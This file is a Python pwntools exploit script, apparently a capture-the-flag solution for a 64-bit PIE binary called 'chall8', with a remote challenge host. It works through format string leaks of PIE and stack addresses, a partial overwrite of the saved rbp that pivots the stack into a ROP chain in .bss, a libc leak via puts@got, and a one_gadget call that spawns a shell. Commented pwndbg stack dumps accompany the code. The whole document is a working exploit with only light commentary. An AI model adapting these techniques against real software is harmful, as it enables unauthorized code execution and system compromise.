from pwn import *
import sys

"""
hm, no libc pointer anywhere..
input is restricted to 13 characters, not enough for a normal format string exploit

idea:
Use format string exploit in `input: ` function to leak return address and stack address.
Using the return address we can calculate the PIE base and address of the input data buffer in .bss where our input is stored.
Write a trampoline ret gadget jumping to the data buffer into the remaining 16 bytes after "yes sir\x00" 
of the 24 byte stack buffer in the `again?` function.
Use the format string exploit to overwrite the lower 2 bytes of the stored ebp of main on the stack to point to the above buffer.

The `data` buffer is filled with a rop chain leaking a libc library, reusing the `read` call in the `again` function
to read additional data. The additional data is placed into the ropchain and eventually executed. Using the libc leak,
we send a magic gadget as the additional data and get a shell.
"""

"""
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

DEBUG = False
REMOTE = False
if len(sys.argv) > 1:
    REMOTE = sys.argv[1] == 'remote'
    DEBUG = sys.argv[1] == 'debug'

if DEBUG:
    context.log_level = 'debug'

if REMOTE:
    p = remote('challenge.pwny.racing', 11532)
    p.libc = ELF('./libc-2.27.so')
    ONE_GADGET_OFFS = 0x4f322
else:
    p = process('./chall8')
    ONE_GADGET_OFFS = 0xe5456 #0x4484f #0x448a3

e = ELF('./chall8')
# leak return address to calculate pie base
p.sendlineafter('input: ', '%17$p')
p.recvuntil('output: ')
e.address = int(p.recv(14).rstrip()[2:], 16) - 0xc08
log.info('PIE base: 0x{:x}'.format(e.address))
p.sendlineafter("retry? (yes sir/nope): ", 'yes sir')

log.info('puts@plt: 0x{:x}'.format(e.plt['puts']))
log.info('puts@got: 0x{:x}'.format(e.got['puts']))

data_addr = e.address + 0x202040
leave_ret_addr = e.address + 0xD06
ret = e.address + 0xD07
log.info('Data buffer: 0x{:x}'.format(data_addr))

if DEBUG:
    gdb.attach(p, '''
    pie 0xD06
    ''')

# leak rbp stack address
p.sendlineafter('input: ', '%16$p')
p.recvuntil('output: ')
target_stack = int(p.recv(14).rstrip()[2:], 16) - 0xb8
log.info('Target stack: 0x{:x}'.format(target_stack))
p.sendafter("retry? (yes sir/nope): ", 'yes sir\x00' + p64(data_addr + 0x8) + p64(leave_ret_addr))

call_puts = e.address + 0x984 # pop rbp too
pop_rdi = e.address + 0xd73
pop_rsi_r15 = e.address + 0xd71
input_addr = e.address + 0xA05
pop_rbp = e.address + 0x850
# pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rsp = e.address + 0xd6d
call_read_in_again = e.address + 0x9AC
# first print out the got a bit to get some libc addresses.
# then read in to the next address which would be popped in the rop chain to start a system(/bin/sh) call
rop = p64(pop_rdi) + p64(e.got['puts']) + p64(ret)*20 + p64(e.plt['puts'])
"""
# call read at next buffer entry to put in new libc addresses
rop += p64(pop_rdi) + p64(0x0) + p64(pop_rsi_r15)
rop += p64(data_addr + len(rop) + 0x28) + p64(0x00) + p64(e.plt['read']) + p64(data_addr + len(rop) + 0x28)
"""
# jump before the read call in again() which does `lea     rax, [rbp+buf]` (buf = 0x20)
# so set rbp up so that rbp-0x20 would point right at the address in our buffer we want to: behind the ropchain
# when read is called, write the one_gadget address.
# now we need to jump to that address. there is a bulky pop rsp gadget, which pops r13, r14 and r15 as well..
# so set rsp to 3*8 before the address where the one_gadget was written to.
# after running the pop rsp gadget it returns to the magic gadget and proceeds to execve(/bin/sh).
rop += p64(pop_rbp) + p64(data_addr + len(rop) + 0x30 + 0x20) + p64(call_read_in_again) + p64(0x00)*6 + p64(pop_rsp) + p64(data_addr + len(rop) + 0x18) 

# change main rsp to controlled buffer
payload = '%{}c%16$hn\x00'.format(target_stack & 0xffff)
p.sendlineafter('input: ', payload.ljust(16) + rop)
log.info('Changed main rsp to: 0x{:x}. Starting rop chain'.format(target_stack+0x8))
# send "nope" to break out of the loop and return from main.
p.sendlineafter("retry? (yes sir/nope): ", 'nope')

# read the puts@got address leaked with the first few ROP elements above.
libc_puts = p.recv(8).rstrip().ljust(8, '\x00')
libc_puts = u64(libc_puts)
log.info('libc puts: {:x}'.format(libc_puts))
p.libc.address = libc_puts - p.libc.vaddr_to_offset(p.libc.symbols['puts'])
log.info('libc base: {:x}'.format(p.libc.address))

"""
system = p.libc.symbols['system']
log.info('system: 0x{:x}'.format(system))
binsh = next(p.libc.search('/bin/sh'))
log.info('/bin/sh: 0x{:x}'.format(binsh))
"""
one_gadget = p.libc.address + ONE_GADGET_OFFS
log.info('magic gadget: 0x{:x}'.format(one_gadget))

# when the ROP chain turns around and jumps to the read() in again() send it the address of the magic gadget.
p.sendline(p64(one_gadget))

p.sendline('ls -la')

"""
# only local :(
# leak libc ptr
p.sendlineafter('input: ', '%12$p')
p.recvuntil('output: ')
stdout_io = int(p.recvline().rstrip()[2:], 16)
p.libc.address = stdout_io - p.libc.vaddr_to_offset(p.libc.symbols['_IO_2_1_stdout_'])
log.info('libc base: 0x{:x}'.format(p.libc.address))
p.sendlineafter("retry? (yes sir/nope): ", 'yes sir')
"""
#      rbp output        saved rbp play    saved rbp main
# rbp  0x7fff8edd0390    0x7fff8edd03d0    0x7fff8edd0430    0x55e03e5c3d10    push   r15
#                        %$16p             %$24p

"""
data buf: 
Breakpoint *0x560872edfb88
pwndbg> telescope $rsp 80
00:0000  rsp  0x7fff68c46940    0x0
...
02:0010       0x7fff68c46950    0x560872edfd98    or     dh, byte ptr [rax + 0x77]
03:0018       0x7fff68c46958    0x560872edfaf9    mov    rax, rsp
04:0020       0x7fff68c46960    0x0
...
06:0030       0x7fff68c46970    0x7f8d6a47f760 (_IO_2_1_stdout_)    0xfbad2887 *** only present locally? ..
07:0038       0x7fff68c46978    0x0
08:0040       0x7fff68c46980    0x7fff68c46940    0x0
09:0048       0x7fff68c46988    0x7fff68c46960    0x0
0a:0050  rbp  0x7fff68c46990    0x7fff68c469d0    0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
0b:0058       0x7fff68c46998    0x560872edfc08    leave  
0c:0060       0x7fff68c469a0    0x0
...
0e:0070       0x7fff68c469b0    0x560872edf7f0    xor    ebp, ebp
0f:0078       0x7fff68c469b8    0x7fff68c46b10    0x1
10:0080       0x7fff68c469c0    0x0
11:0088       0x7fff68c469c8    0x7fff68c469a0    0x0
12:0090       0x7fff68c469d0    0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
13:0098       0x7fff68c469d8    0x560872edfcfa    test   eax, eax
14:00a0       0x7fff68c469e0    0x0
...
16:00b0       0x7fff68c469f0    0x1
17:00b8       0x7fff68c469f8    0x560872edfd5d    add    rbx, 1
18:00c0       0x7fff68c46a00    0x7f8d6a4ac530 (_dl_fini)    push   rbp
19:00c8       0x7fff68c46a08    0x7fff68c46b28    0x0
1a:00d0       0x7fff68c46a10    0x7fff68c46b18    0x0
1b:00d8       0x7fff68c46a18    0x172edf7f0
1c:00e0       0x7fff68c46a20    0x7fff68c46b10    0x1
1d:00e8       0x7fff68c46a28    0x7fff68c469e0    0x0
1e:00f0       0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
1f:00f8       0x7fff68c46a38    0x560872edf96b    push   rbp
20:0100       0x7fff68c46a40    0x0
21:0108       0x7fff68c46a48    0x7fff68c46b18    0x0
22:0110       0x7fff68c46a50    0x100040000
23:0118       0x7fff68c46a58    0x560872edfc0a    push   rbp
24:0120       0x7fff68c46a60    0x0
25:0128       0x7fff68c46a68    0x26215afb3305a490
26:0130       0x7fff68c46a70    0x560872edf7f0    xor    ebp, ebp
27:0138       0x7fff68c46a78    0x7fff68c46b10    0x1
28:0140       0x7fff68c46a80    0x0
...
2a:0150       0x7fff68c46a90    0x75cf6ea81da5a490
2b:0158       0x7fff68c46a98    0x752b6b7c2983a490
2c:0160       0x7fff68c46aa0    0x0
...
2f:0178       0x7fff68c46ab8    0x7fff68c46b28    0x0
30:0180       0x7fff68c46ac0    0xabcdef
31:0188       0x7fff68c46ac8    0x7f8d6a4ac476 (_dl_init+118)    cmp    ebx, -1
32:0190       0x7fff68c46ad0    0x0
...
34:01a0       0x7fff68c46ae0    0x560872edf7f0    xor    ebp, ebp
35:01a8       0x7fff68c46ae8    0x7fff68c46b10    0x1
36:01b0       0x7fff68c46af0    0x0
37:01b8       0x7fff68c46af8    0x560872edf81a    hlt    
38:01c0       0x7fff68c46b00    0x7fff68c46b08    0x1c
39:01c8       0x7fff68c46b08    0x1c
3a:01d0  r13  0x7fff68c46b10    0x1
3b:01d8       0x7fff68c46b18    0x0
...
"""

"""
dump of the saved rbp chain:
rbp  0x7fff68c46990    0x7fff68c469d0    0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
output()
 RBP  0x7fff68c46990    0x7fff68c469d0    0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
 RSP  0x7fff68c46940    0x0
 RIP  0x560872edfb92    leave

   0x560872edfb92    leave  
   0x560872edfb93    ret

 RBP  0x7fff68c469d0    0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
 RSP  0x7fff68c46998    0x560872edfc08    leave  
 RIP  0x560872edfb93    ret 

   0x560872edfb92    leave  
   0x560872edfb93    ret    <0x560872edfc08>

play()
 RBP  0x7fff68c469d0    0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
 RSP  0x7fff68c469a0    0x0
 RIP  0x560872edfc08    leave  

   0x560872edfc08    leave  
   0x560872edfc09    ret 

 RBP  0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
 RSP  0x7fff68c469d8    0x560872edfcfa    test   eax, eax
 RIP  0x560872edfc09    ret 

   0x560872edfc08    leave  
   0x560872edfc09    ret    <0x560872edfcfa>


main()
 RBP  0x7fff68c46a30    0x560872edfd04    add    byte ptr [rax], al
 RSP  0x7fff68c469e0    0x0
 RIP  0x560872edfcfa    test   eax, eax

   0x560872edfcfa    test   eax, eax
   0x560872edfcfc    je     0x560872edfd00
.....
   0x560872edfd06    leave  
   0x560872edfd07    ret

 RBP  0x560872edfd04    add    byte ptr [rax], al
 RSP  0x7fff68c46a38    0x560872edf96b    push   rbp
 RIP  0x560872edfd07    ret 

   0x560872edfd06    leave  
   0x560872edfd07    ret    <0x560872edf96b>
"""
"""
for i in range(1, 200):
    p.sendlineafter('input: ', '%{}$p'.format(i))
    p.recvuntil('output: ')
    data = p.recvline().rstrip()
    print('{:03d}: {}'.format(i, data))
    p.sendlineafter("retry? (yes sir/nope): ", 'yes sir')
"""

p.interactive()